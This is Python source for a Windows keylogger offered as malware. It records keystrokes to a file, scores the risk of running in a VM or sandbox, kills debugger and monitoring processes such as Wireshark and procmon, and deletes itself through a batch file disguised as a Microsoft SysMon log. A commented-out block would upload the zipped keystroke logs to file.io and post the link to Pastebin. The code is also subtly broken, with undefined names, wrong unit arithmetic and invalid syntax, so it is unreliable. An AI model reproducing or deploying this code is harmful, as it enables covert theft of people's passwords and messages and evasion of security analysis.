#/usr/bin/env python
# -*- coding:utf-8 -*-
import os
import sys
import wmi
import time
import psutil
import threading
import subprocess

from ctypes import *
from datetime import datetime as dt

###--NOT IMPLEMENTED IN BASE LOGGER---###
"""
import subprocess
from zipfile import *
from pyupload.uploader import * # Setup for this lib compatible with Py2
from pastebin_python import PastebinPython
from pastebin_python.pastebin_exceptions import *
from pastebin_python.pastebin_constants import *
from pastebin_python.pastebin_formats import *

pbin  = PastebinPython(api_dev_key='###---YOUR API KEY HERE---###')

"""
###--NOT IMPLEMENTED IN BASE LOGGER---###

Debug = False
DBG   = False
VM    = False

name     = sys.argv[0]
location = os.abspath(name)

"""
We prepare a keymap to utilize with the
ctypes module in order to log keystrokes
"""
VKStr = {}
VKStr[0x01] = "LEFT_MOUSEE"
VKStr[0x02] = "RIGHT_MOUSE"
VKStr[0x03] = "MIDDLE_MOUSE"
VKStr[0x08] = "BACKSPACE"
VKStr[0x09] = "TAB"
VKStr[0x0D] = "ENTER"
VKStr[0x10] = "SHIFT"
VKStr[0x11] = "CTRL"
VKStr[0x12] = "ALT"
VKStr[0x14] = "CAPSLOCK"
VKStr[0x18] = "ESCAPE"
VKStr[0x20] = " "
VKStr[0x25] = "LEFT_ARROW"
VKStr[0x26] = "UP_ARROW"
VKStr[0x27] = "RIGHT_ARROW"
VKStr[0x28] = "DOWN_ARROW"
VKStr[0x2C] = "PRINT_SCREEN"
VKStr[0x30] = "0"
VKStr[0x31] = "1"
VKStr[0x32] = "2"
VKStr[0x33] = "3"
VKStr[0x34] = "4"
VKStr[0x35] = "5"
VKStr[0x36] = "6"
VKStr[0x37] = "7"
VKStr[0x38] = "8"
VKStr[0x39] = "9"
VKStr[0x41] = "a"
VKStr[0x42] = "b"
VKStr[0x43] = "c"
VKStr[0x44] = "d"
VKStr[0x45] = "e"
VKStr[0x46] = "f"
VKStr[0x47] = "g"
VKStr[0x48] = "h"
VKStr[0x49] = "i"
VKStr[0x4A] = "j"
VKStr[0x4B] = "k"
VKStr[0x4C] = "l"
VKStr[0x4D] = "m"
VKStr[0x4E] = "n"
VKStr[0x4F] = "o"
VKStr[0x50] = "p"
VKStr[0x51] = "q"
VKStr[0x52] = "r"
VKStr[0x53] = "s"
VKStr[0x54] = "t"
VKStr[0x55] = "u"
VKStr[0x56] = "v"
VKStr[0x57] = "w"
VKStr[0x58] = "x"
VKStr[0x59] = "y"
VKStr[0x5A] = "z"

ShiftEquivs={}
ShiftEquivs[0x30] = ")"
ShiftEquivs[0x31] = "!"
ShiftEquivs[0x32] = "\""
ShiftEquivs[0x33] = "£"
ShiftEquivs[0x34] = "$"
ShiftEquivs[0x35] = "%"
ShiftEquivs[0x36] = "^"
ShiftEquivs[0x37] = "&"
ShiftEquivs[0x38] = "*"
ShiftEquivs[0x39] = "("

ActiveKeys = {}
# We need to be able to execute CMD commands to self-destruct if need be
def cmdline(command):
    process = subprocess.Popen(
        args=command,
        stdout=subprocess.PIPE,
        shell=True)

    return process.communicate()[0]

"""
Here we have some anti-forensic measures.

We will assign points for types of obstacles we may come across.
We check for debugger processes, OS uptime, drive size among other
things in order to try to figure out wether we are being executed
in a VM or potentially being debugged or at risk of those things
Then we simply add up the points and act according to our risk score
"""
def risk():
    risk_score = 0

    # Check uptime
    uptime_sec    = time.time() - psutil.boot_time()
    uptime_minute = uptime_sec * 60
    uptime_hour   = uptime_minute * 60

    # Tally risk score
    if uptime_hour < 1:
        risk_score += 5

    # Clock
    ran_int = random.randint(1,21)*5
    time.sleep(ran_int)

    # Disk Size
    # with os.statvfs, we need to multiply block sizes by block counts to get bytes
    stats = os.statvfs(path)
    total = stats.f_frsize * stats.f_blocks
    free  = stats.f_frsize * stats.f_bavail

    total_mb   = total * 100 # Calculates from bytes to Mb
    total_free = free * 100

    disk_usage ={ "total": total,
	      "free" : free,
	      "used" : total - free, }

    # Tally risk score
    if total_free < 40:
	risk_score += 5

    # Clock
    ran_int = random.randint(1,21)*5
    time.sleep(ran_int)


    # Anti VM
    VMProcessList = ["vmsrvc.exe", "vmware.exe","vbox.exe",
		"vmvss.exe","vmscsi.exe","vmhgfs.exe","vboxservice.exe",
		"vmxnet.exe","vmx_svga.exe","vmmemctl.exe",
		"autoruns.exe","autorunsc.exe","vmusbmouse.exe","vmtools.exe",
		"regmon.exe","vboxtray.exe", "vmrawdsk.exe","joeboxcontrol.exe",
		"joeboxserver.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
		"vmusrvc.exe","xenservice.exe"]

    # Debug proc check
    DebugList = ["ollydbg.exe","ProcessHacker.exe", "fiddler.exe",
		"tcpview.exe","df5serv.exe", "filemon.exe","procmon.exe","regmon.exe",
		"procexp.exe","idaq.exe","idaq64.exe","ImmunityDebugger.exe","Wireshark.exe",
		"dumpcap.exe","HookExplorer.exe","ImportREC.exe","PETools.exe","LordPE.exe",
		"SysInspector.exe","proc_analyzer.exe","sysAnalyzer.exe","sniff_hit.exe","windbg.exe",
		"prl_cc.exe","prl_tools.exe","xenservice.exe"]

    DBG_out = []

    for proc in psutil.process_iter():
	if proc.name() in DebugList:
	    #print(proc)
            DBG = True

	    try:
		p = psutil.Process(proc.pid)
		time.sleep(0.33)
		p.kill()
	    except Exception as e:
		#print e
		DBG_out.append(proc)
		continue

	elif proc.name() in VMProcessList:
	     #print(proc)
	     VM = True

            continue

	"""
	If there were DBG procs check to see
	if we managed to kill them all by counting
	the number of items in the DBG_out array

	In case it's empty assume we killed all
	and switch DBG back to False
	"""
	cnt = 0
	for i in DBG_out:
	    cnt += 1

	if not cnt < 1:
	    DBG = False

	if DBG and VM == True:
	    risk_score += 15
	    return risk_score

	elif DBG == True:
	    risk_score += 12
	    return risk_score

	elif VM == True:
	    risk_score += 11
	    return risk_score

	else:
	    return risk_score

"""
Main logger logic starts here
"""
class Thread():
    def __init__(self, addressOf, args):
        self.terminate = False
        self.Instance = threading.Thread(target=addressOf, args=args)
        self.Instance.daemon = True
        self.Instance.start()

def StringToVK(string):
    for key, value in VKStr.items():
        if value == string:
            return key

def VKToString(VK):
    return VKStr[VK]

def IsKeyPressed(VK_KEYCODE):
    if type(VK_KEYCODE) == str:
        try:
            VK_KEYCODE = StringToVK(VK_KEYCODE)
        except Exception as e:
	    if debug:
	        e = "Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid"
		sys.exit(e)
        return

    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x8000 != 0

def IsKeyToggled(VK_KEYCODE):
    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x0001 != 0

class KeyTracker:
    def __init__(self):
        self.tracking = False
        self.tracked_string_concat = ""
        self.file_open = False

    def StartTracking(self):
        self.tracking = True

    def StopTracking(self):
        self.tracking = False
        self.CompileData()

    def KeyDown(self, key):
        if self.tracking and VKToString(key) != "SHIFT":
            if IsKeyToggled(StringToVK("CAPSLOCK")):
                self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
            elif IsKeyPressed(StringToVK("SHIFT")):
                shiftEquiv = False
                try:
                    ShiftEquivs[key]
                    shiftEquiv = True
                except:
                    pass

                if shiftEquiv:
                    self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key]
                else:
                    self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
            else:
                self.tracked_string_concat = self.tracked_string_concat + VKToString(key)

    def KeyUp(self, key):
        if self.tracking and VKToString(key) == "SHIFT":
            #self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
            pass

    def UpdateKeyState(self, key, state):

        def SetKeyState(key, state):
            ActiveKeys[key] = state
            if state == True:
                self.KeyDown(key)
            elif state == False:
                self.KeyUp(key)

        keyExists = False
        try:
            ActiveKeys[key]
            keyExists = True
        except:
            pass

        if keyExists:
            if ActiveKeys[key] != state:
                SetKeyState(key, state)
        else:
            SetKeyState(key, state)

    def CompileData(self):
	outfile = open("data.txt", "a")
        outfile.write("\n")
        outfile.write("-"*15)
        outfile.write("\n")
        outfile.write(self.tracked_string_concat)

        ###--NOT IMPLEMENTED IN BASE LOGGER---###
        """
        def CompileData(self):
            # Create zipped file contents
            contents = "\n%s\n%s" % ('-'*15, self.tracked_string_concat)

            with ZipFile("data.zip", "w") as zip:
	        zip.writestr('data.txt', contents)

            url = upload('fileio', 'data.zip')
	    result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")

         """
         ###--NOT IMPLEMENTED IN BASE LOGGER---###

    def TrackData(self, time_length): # Time in seconds
        KeyTracker.StartTracking()
        time.sleep(time_length)
        KeyTracker.StopTracking()
"""
Main logger logic ends here.
"""


# Start block
def start():

	KeyTracker = KeyTracker()
	t = Thread(KeyTracker.TrackData, [5])

	while True:
	    for key, key_name in VKStr.items():
	        KeyTracker.UpdateKeyState(key, IsKeyPressed(key))


def selfdestruct():
    filename = executable.split("\\")[-1]
    data = '''@echo off
REM Microsoft(tm) --- SysMon task log

TASKKILL /F /IM "{0}"
break>{0}
DEL -f "{0}"
break>"%~f0" && DEL "%~f0"

REM EOF --- End Of File

echo sysmon >> {0}'''.format( filename )
    f = open("sysmon.bat","w")
    f.write(data)
    f.close()
    cmdline("sysmon.bat >> NUL")

if __name__ == "__main__":
    risk = risk()
    if risk == 25:
	# All checks report risk
	# Restricted: Terminate
	selfdestruct()
    elif risk == 17:
	# Flag for DBG proc, flag for VM indicator
	# Restricted: Terminate
	selfdestruct()
    elif risk == 16:
	# Flag for VM proc, flag for VM indicator
	# Restricted: Terminate.
	selfdestruct()
    elif risk == 10:
	# Two VM indicator flags
	# Moderate risk: User Discretion
	# selfdestruct()
    elif risk == 5:
	# One VM indicator
	# Low risk: User Discretion
	# selfdestruct()
    else risk == 0:
	# No indicators
	# Of course, this just means we were unable
	# To find indicators, not that we are 100% safe.
	start()
